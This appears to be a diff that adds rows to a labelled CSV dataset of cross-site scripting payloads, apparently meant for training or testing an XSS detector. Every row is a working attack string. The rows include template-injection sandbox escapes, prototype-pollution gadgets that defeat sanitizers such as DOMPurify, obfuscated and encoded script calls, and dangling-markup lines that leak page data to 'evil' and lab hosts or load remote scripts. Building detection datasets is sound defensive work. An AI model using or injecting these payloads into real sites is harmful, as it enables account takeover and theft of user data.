+<svg><svg><b><noscript>&lt;/noscript&gt;&lt;iframe&Tab;onload=setTimeout(/alert(1)/.source)&gt;</noscript></b></svg>,dom_sink,template,high,116
+"<a @['c\lic\u{6b}']=""_c.constructor('alert(1)')()"">test</a>",template_injection,template,medium,59
+{{$el.ownerDocument.defaultView.alert(1)}},template_injection,template,medium,42
+"<p slot-scope=""){}}])+this.constructor.constructor('alert(1)')()})};//"">",template_injection,template,medium,72
+{{_createBlock.constructor('alert(1)')()}},template_injection,template,medium,42
+{{_createVNode.constructor('alert(1)')()}},template_injection,template,medium,42
+<p v-show=_createBlock.constructor`alert(1)`()>,template_injection,template,medium,47
+<x @[_openBlock.constructor`alert(1)`()]>,template_injection,template,medium,41
+<x @[_capitalize.constructor`alert(1)`()]>,template_injection,template,medium,42
+"{{!ready && (ready = true) && (
+!call
+? $$watchers[0].get(toString.constructor.prototype)
+: (a = apply) &&
+(apply = constructor) &&
+(valueOf = call) &&
+(''+''.toString(
+'F = Function.prototype;' +
+'F.apply = F.a;' +
+'delete F.a;' +
+'delete F.valueOf;' +
+'alert(1);'
+)));}}",template_injection,template,medium,272
+"{{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert(1)//');}}",template_injection,template,medium,102
+{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}},template_injection,template,medium,79
+"{{
+c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
+c.$apply=$apply;c.$eval=b;op=$root.$$phase;
+$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
+C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
+B=C(b,c,b);$evalAsync(""
+astNode=pop();astNode.type='UnaryExpression';
+astNode.operator='(window.X?void0:(window.X=true,alert(1)))+';
+astNode.argument={type:'Identifier',name:'foo'};
+"");
+m1=B($$asyncQueue.pop().expression,null,$root);
+m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
+$eval('a(b.c)');[].push.apply=a;
+}}",template_injection,template,medium,517
+"a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()",template_injection,template,medium,118
+"toString.constructor.prototype.toString=toString.constructor.prototype.call;[""a"",""alert(1)""].sort(toString.constructor)",template_injection,template,medium,119
+{y:''.constructor.prototype}.y.charAt=[].join;[1]|orderBy:'x=alert(1)',template_injection,template,medium,70
+"toString().constructor.prototype.charAt=[].join; [1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)",template_injection,template,medium,134
+"<body background=""//evil?
+<table background=""//evil?
+<table><thead background=""//evil?
+<table><tbody background=""//evil?
+<table><tfoot background=""//evil?
+<table><td background=""//evil?
+<table><th background=""//evil?",tag_injection,obfuscation,low,216
+"<link rel=stylesheet href=""//evil?",tag_injection,obfuscation,low,34
+"<link rel=icon href=""//evil?",tag_injection,obfuscation,low,28
+"<meta http-equiv=""refresh"" content=""0; http://evil?",attribute,obfuscation,medium,51
+"<img src=""//evil?
+<image src=""//evil?",tag_injection,obfuscation,low,37
+"<video><track default src=""//evil?",tag_injection,obfuscation,low,34
+"<video><source src=""//evil?",tag_injection,obfuscation,low,27
+"<audio><source src=""//evil?",tag_injection,obfuscation,low,27
+"<input type=image src=""//evil?",tag_injection,obfuscation,low,30
+"<form><button style=""width:100%;height:100%"" type=submit formaction=""//evil?",tag_injection,obfuscation,low,76
+"<form><input type=submit value=""XSS"" style=""width:100%;height:100%"" type=submit formaction=""//evil?",tag_injection,obfuscation,low,99
+"<button form=x style=""width:100%;height:100%;""><form id=x action=""//evil?",tag_injection,obfuscation,low,73
+"<object data=""//evil?",tag_injection,obfuscation,low,21
+"<iframe src=""//evil?",tag_injection,obfuscation,low,20
+"<embed src=""//evil?",tag_injection,obfuscation,low,19
+<form><button formaction=//evil>XSS</button><textarea name=x>,tag_injection,obfuscation,low,61
+<button form=x>XSS</button><form id=x action=//evil target=',tag_injection,obfuscation,low,60
+"<a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html><font size=100 color=red>You must click me</font></a><base target=""",tag_injection,obfuscation,low,140
+"<form><input type=submit value=""Click me"" formaction=http://subdomain1.portswigger-labs.net/dangling_markup/name.html formtarget=""",tag_injection,obfuscation,low,130
+"<a href=abc style=""width:100%;height:100%;position:absolute;font-size:1000px;"">xss<base href=""//evil/",tag_injection,obfuscation,low,101
+"<embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=""",tag_injection,obfuscation,low,82
+"<iframe src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=""",tag_injection,obfuscation,low,83
+"<object data=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=""",tag_injection,obfuscation,low,84
+"<frameset><frame src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=""",tag_injection,obfuscation,low,92
+"<input type=hidden type=image src=""//evil?",tag_injection,obfuscation,low,42
+"<video poster=""//evil?",tag_injection,obfuscation,low,22
+"javascript:""/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \""
+ onmouseover=/*&lt;svg/*/onload=alert()//>",js_uri,obfuscation,high,142
+"javascript:/*--></title></style></textarea></script></xmp><details/open/ontoggle='+/`/+/""/+/onmouseover=1/+/[*/[]/+alert(/@PortSwiggerRes/)//'>",js_uri,obfuscation,high,143
+';top['ale'+'rt'](top['doc'+'ument']['dom'+'ain']);//,attribute_escape,obfuscation,medium,53
+';frames['ale'+'rt'](frames['doc'+'ument']['dom'+'ain']);//,attribute_escape,obfuscation,medium,59
+';top[/*foo*/'alert'/*bar*/](top[/*foo*/'document'/*bar*/]['domain']);//,attribute_escape,obfuscation,medium,72
+';frames[/*foo*/'alert'/*bar*/](frames[/*foo*/'document'/*bar*/]['domain']);//,attribute_escape,obfuscation,medium,78
+';window['\x61\x6c\x65\x72\x74'](window['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//,attribute_escape,encoding,medium,107
+';this['\x61\x6c\x65\x72\x74'](this['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//,attribute_escape,encoding,medium,103
+';top['\x61\x6c\x65\x72\x74'](top['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//,attribute_escape,encoding,medium,101
+';parent['\x61\x6c\x65\x72\x74'](parent['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//,attribute_escape,encoding,medium,107
+';frames['\x61\x6c\x65\x72\x74'](frames['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//,attribute_escape,encoding,medium,107
+';globalThis['\x61\x6c\x65\x72\x74'](globalThis['\x64\x6f\x63\x75\x6d\x65\x6e\x74']['\x64\x6f\x6d\x61\x69\x6e']);//,attribute_escape,encoding,medium,115
+"';window['\x65\x76\x61\x6c']('window[""\x61\x6c\x65\x72\x74""](window[""\x61\x74\x6f\x62""](""WFNT""))');//",attribute_escape,encoding,medium,101
+"';self['\x65\x76\x61\x6c']('self[""\x61\x6c\x65\x72\x74""](self[""\x61\x74\x6f\x62""](""WFNT""))');//",attribute_escape,encoding,medium,95
+"';this['\x65\x76\x61\x6c']('this[""\x61\x6c\x65\x72\x74""](this[""\x61\x74\x6f\x62""](""WFNT""))');//",attribute_escape,encoding,medium,95
+"';top['\x65\x76\x61\x6c']('top[""\x61\x6c\x65\x72\x74""](top[""\x61\x74\x6f\x62""](""WFNT""))');//",attribute_escape,encoding,medium,92
+';window['\141\154\145\162\164']('\130\123\123');//,attribute_escape,obfuscation,medium,51
+';self['\141\154\145\162\164']('\130\123\123');//,attribute_escape,obfuscation,medium,49
+';parent['\141\154\145\162\164']('\130\123\123');//,attribute_escape,obfuscation,medium,51
+';globalThis['\141\154\145\162\164']('\130\123\123');//,attribute_escape,obfuscation,medium,55
+';self['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//,attribute_escape,encoding,medium,81
+';this['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//,attribute_escape,encoding,medium,81
+';top['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//,attribute_escape,encoding,medium,80
+';frames['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//,attribute_escape,encoding,medium,83
+';globalThis['\u{0061}\u{006c}\u{0065}\u{0072}\u{0074}']('\u{0058}\u{0053}\u{0053}');//,attribute_escape,encoding,medium,87
+';window[/al/.source+/ert/.source](/XSS/.source);//,attribute_escape,obfuscation,medium,51
+';self[/al/.source+/ert/.source](/XSS/.source);//,attribute_escape,obfuscation,medium,49
+';this[/al/.source+/ert/.source](/XSS/.source);//,attribute_escape,obfuscation,medium,49
+';top[/al/.source+/ert/.source](/XSS/.source);//,attribute_escape,obfuscation,medium,48
+';parent[/al/.source+/ert/.source](/XSS/.source);//,attribute_escape,obfuscation,medium,51
+';frames[/al/.source+/ert/.source](/XSS/.source);//,attribute_escape,obfuscation,medium,51
+';globalThis[/al/.source+/ert/.source](/XSS/.source);//,attribute_escape,obfuscation,medium,55
+';this[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//,attribute_escape,obfuscation,medium,123
+';top[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//,attribute_escape,obfuscation,medium,122
+';parent[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//,attribute_escape,obfuscation,medium,125
+';frames[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//,attribute_escape,obfuscation,medium,125
+';globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//,attribute_escape,obfuscation,medium,129
+<script>Object.prototype.innerHTML = '<img/src/onerror=alert(1)>';</script>,dom_sink,event_handler,high,75
+<script>Object.prototype.preventDefault='x';Object.prototype.handleObj='x';Object.prototype.delegateTarget='<img/src/onerror=alert(1)>';/* No extra code needed for jQuery 1 & 2 */$(document).off('foobar');</script>,script_injection,obfuscation,high,214
+"<script>Object.prototype.div=['1','<img src onerror=alert(1)>','1']</script><script>$('<div x=""x""></div>')</script>",script_injection,event_handler,high,115
+"<script>Object.prototype.url = ['data:,alert(1)//'];Object.prototype.dataType = 'script';</script><script>$.get('https://google.com/');$.post('https://google.com/');</script>",script_injection,obfuscation,high,174
+"<script>Object.prototype.src = ['data:,alert(1)//']</script><script>$.getScript('https://google.com/')</script>",script_injection,obfuscation,high,111
+"<script>Object.prototype.url = 'data:,alert(1)//'</script><script>$.getScript('https://google.com/')</script>",script_injection,obfuscation,high,109
+"<script>Object.prototype.srcdoc=['<script>alert(1)<\/script>']</script><div class=""g-recaptcha"" data-sitekey=""your-site-key""/>",script_injection,script_tag,high,126
+<script>Object.prototype.hif = ['javascript:alert(document.domain)'];</script>,script_injection,script_tag,high,78
+<script>Object.prototype.attrs = {src:1};Object.prototype.src='https://portswigger-labs.net/xss/xss.js'</script>,script_injection,obfuscation,high,112
+<script>Object.prototype.BOOMR = 1;Object.prototype.url='https://portswigger-labs.net/xss/xss.js'</script>,script_injection,obfuscation,high,106
+<script>Object.prototype.sourceURL = '\u2028\u2029alert(1)'</script><script>_.template('test')</script>,script_injection,encoding,high,103
+<script>Object.prototype['*'] = ['onload']</script><script>document.write(sanitizeHtml('<iframe onload=alert(1)>'))</script>,dom_sink,event_handler,high,124
+"<script>Object.prototype.whiteList = {img: ['onerror', 'src']}</script><script>document.write(filterXSS('<img src onerror=alert(1)>'))</script>",dom_sink,event_handler,high,143
+"<script>Object.prototype.ALLOWED_ATTR = ['onerror', 'src']</script><script>document.write(DOMPurify.sanitize('<img src onerror=alert(1)>'))</script>",dom_sink,event_handler,high,148
+<script>Object.prototype.documentMode = 9</script>,script_injection,script_tag,high,50
+<script>const html = '<img src onerror=alert(1)>';const sanitizer = new goog.html.sanitizer.HtmlSanitizer();const sanitized = sanitizer.sanitize(html);const node = goog.dom.safeHtmlToNode(sanitized);document.body.append(node);</script>,script_injection,event_handler,high,235
+"<script>Object.prototype.CLOSURE_BASE_PATH = 'data:,alert(1)//';</script>",script_injection,obfuscation,high,73
+"<script>Object.prototype.tagName = 'img'Object.prototype.src = ['x:x']Object.prototype.onerror = ['alert(1)']</script><script>(function() {var View = Mn.View.extend({template: '#template-layout'});var App = Mn.Application.extend({region: '#app', onStart: function() {this.showView(new View());}});var app = new App();app.start();})();</script><div id=""template-layout"" type=""x-template/underscore"">xxx</div>",script_injection,script_tag,high,407
+"<script>Object.prototype.src='data:,alert(1)//'</script>",script_injection,obfuscation,high,56
+<script>Object.prototype.onload = 'alert(1)'</script>,script_injection,script_tag,high,53
+"<script>Object.prototype.script = [1,'<img/src/onerror=alert(1)>','<img/src/onerror=alert(2)>']</script>",script_injection,event_handler,high,104
+"<strong data-bind=""text:'hello'""></strong><script>Object.prototype[4]=""a':1,[alert(1)]:1,'b"";Object.prototype[5]=',';</script><script>ko.applyBindings({})</script>",script_injection,script_tag,high,163
+"<script>Object.prototype.on = 'click';$('body').on('click', function() { alert('Injected Event'); });$('body').trigger('click');</script>",script_injection,script_tag,high,137
+"<body background=""javascript:alert(1)"">",generic,protocol,medium,39
+"<iframe src=""data:text/html,<img src=1 onerror=alert(document.domain)>"">",attribute,event_handler,high,72
+"<a href=""vbscript:MsgBox+1"">XSS</a>
+<a href=""#"" onclick=""vbs:Msgbox+1"">XSS</a>
+<a href=""#"" onclick=""VBS:Msgbox+1"">XSS</a>
+<a href=""#"" onclick=""vbscript:Msgbox+1"">XSS</a>
+<a href=""#"" onclick=""VBSCRIPT:Msgbox+1"">XSS</a>
+<a href=""#"" language=vbs onclick=""vbscript:Msgbox+1"">XSS</a>",attribute,event_handler,medium,278
+"<a href=""#"" onclick=""jscript.compact:alert(1);"">test</a>
+<a href=""#"" onclick=""JSCRIPT.COMPACT:alert(1);"">test</a>",attribute,event_handler,medium,113
+"<a href=# language=""JScript.Encode"" onclick=""#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@"">XSS</a>
+<a href=# onclick=""JScript.Encode:#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@"">XSS</a>",attribute,event_handler,medium,162
+"<iframe onload=VBScript.Encode:#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@>
+<iframe language=VBScript.Encode onload=#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@>",event_handler,event_handler,high,138
+"<a title=""&{alert(1)}"">XSS</a>",generic,tag_injection,medium,30
+"<link href=""xss.js"" rel=stylesheet type=""text/javascript"">",generic,tag_injection,medium,58
+<form><button name=x formaction=x><b>stealme,generic,tag_injection,medium,44
+"<form action=x><button>XSS</button><select name=x><option><plaintext><script>token=""supersecret""</script>",script_injection,script_tag,high,105
+"<div style=""-moz-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)"">
+<div style=""\-\mo\z-binding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)"">
+<div style=""-moz-bindin\67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)"">
+<div style=""-moz-bindin&#x5c;67:url(//businessinfo.co.uk/lab s/xbl/xbl.xml#xss)"">",generic,encoding,medium,309
+"<img src=""blah"" style=""-moz-binding: url(data:text/xml;charset=utf-8,%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Cbindings%20xmlns%3D%22 http%3A//www.mozilla.org/xbl%22%3E%3Cbinding%20id%3D%22loader%22%3E%3Cimplementation%3E%3Cconstructor%3E%3C%21%5BCDATA%5Bvar%20url%20%3D%20%22alert.js %22%3B%20var%20scr%20%3D%20document.createElement%28%22script%22%29%3B%20scr.setAttribute%28%22src%22%2Curl%29%3B%20var%20bodyElement%20%3D%20 document.getElementsByTagName%28%22html%22%29.item%280%29%3B%20bodyElement.appendChild%28scr%29%3B%20%5D%5D%3E%3C/constructor%3E%3C/implementation%3E%3C/ binding%3E%3C/bindings%3E)"" />",generic,obfuscation,medium,610
+"<div style=xss:expression(alert(1))>
+<div style=xss:expression(1)-alert(1)>
+<div style=xss:expressio\6e(alert(1))>
+<div style=xss:expressio\006e(alert(1))>
+<div style=xss:expressio\00006e(alert(1))>
+<div style=xss:expressio\6e(alert(1))>
+<div style=xss:expressio&#x5c;6e(alert(1))>",generic,encoding,medium,281
+"<div style=xss=expression(alert(1))>
+<div style=""color&#x3dred"">test</div>",generic,encoding,medium,74
+"<a style=""behavior:url(#default#AnchorClick);"" folder=""javascript:alert(1)"">XSS</a>",generic,protocol,medium,83
+"<script>
+function window.onload(){
+alert(1);
+}
+</script>
+<script>
+function window::onload(){
+alert(1);
+}
+</script>
+<script>
+function window.location(){
+}
+</script>
+<body>
+<script>
+function/*<img src=1 onerror=alert(1)>*/document.body.innerHTML(){}
+</script>
+</body>
+<body>
+<script>
+function document.body.innerHTML(){ x = ""<img src=1 onerror=alert(1)>""; }
+</script>
+</body>",dom_sink,obfuscation,high,373
+"<HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS<img src=1 onerror=alert(1)>""> </BODY></HTML>",attribute,event_handler,high,215
+"<a href=""javascript& #x6a;avascript:alert(1)"">Firefox</a>",generic,tag_injection,medium,57
+"<a href=""javascript& colon ;alert(1)"">Firefox</a>",generic,tag_injection,medium,49
+"<!- - ><img title=""--><iframe/onload=alert(1)>""> -->
+<!-     - ><img title=""--><iframe/onload=alert(1)>""> -->",attribute,event_handler,high,109
+<svg><xss onload=alert(1)>,event_handler,event_handler,high,26
+"<isindex type=image src=""//evil?",generic,obfuscation,medium,32
+"<isindex type=submit style=width:100%;height:100%; value=XSS formaction=""//evil?",generic,obfuscation,medium,80
+<isindex type=submit formaction=javascript:alert(1)>,generic,protocol,medium,52
+<isindex type=submit action=javascript:alert(1)>,generic,protocol,medium,48
+"<svg><use href=""//subdomain1.portswigger-labs.net/use_element/upload.php#x"" /></svg>",generic,obfuscation,medium,84
+<marquee width=1 loop=1 onbounce=alert(1)>XSS</marquee>,event_handler,event_handler,medium,55
+<marquee width=1 loop=1 onfinish=alert(1)>XSS</marquee>,event_handler,event_handler,medium,55
+<marquee onstart=alert(1)>XSS</marquee>,event_handler,event_handler,medium,39
+<script>location.protocol='javascript'</script>,script_injection,script_tag,high,47
+"<a href=""%0aalert(1)"" onclick=""protocol='javascript'"">test</a>",attribute,event_handler,medium,62
+"<svg><use href=""data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==#x"" /></svg>",generic,protocol,medium,270
+"<svg><use href=""data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x"" />",attribute,obfuscation,high,149
+"<a href=""javascript://%0aalert(1)"">XSS</a>",generic,obfuscation,medium,42
+"<base href=""javascript:/a/-alert(1)///////""><a href=../lol/safari.html>test</a>",generic,obfuscation,medium,79
+"<object data=""javascript:alert(1)"">",generic,protocol,medium,35
+<object data=# codebase=javascript:alert(document.domain)//>,generic,obfuscation,medium,60
+<embed src=# codebase=javascript:alert(document.domain)//>,generic,obfuscation,medium,58
+"<object data=""#
+alert(1)"" codebase=javascript://>",generic,obfuscation,medium,49
+"<object data=""#!
+alert(1)"" codebase=javascript:>",generic,protocol,medium,48
+"<embed src=""#
+alert(1)"" codebase=javascript://>",generic,obfuscation,medium,47
+"<embed src=""#!
+alert(1)"" codebase=javascript:>",generic,protocol,medium,46
+"<script>throw onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:name}</script>",script_injection,event_handler,high,89
+"<svg onload=""throw top.onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:'/*'+URL}"">",attribute,obfuscation,high,95
+"<body onload=""throw onerror=eval,{lineNumber:1,columnNumber:1,fileName:1,message:'/*'+location}"">",attribute,obfuscation,high,97
+"<svg><use href=""data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' /></a></svg>#x""></use></svg>",generic,obfuscation,medium,257
+"<svg><animate xlink:href=""#x"" attributeName=""href"" values=""data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg'&gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x"" /><use id=x />",attribute,obfuscation,high,204
+<x onbeforescriptexecute=alert(1)><script>1</script>,script_injection,event_handler,high,52
+<x onafterscriptexecute=alert(1)><script>1</script>,script_injection,event_handler,high,51
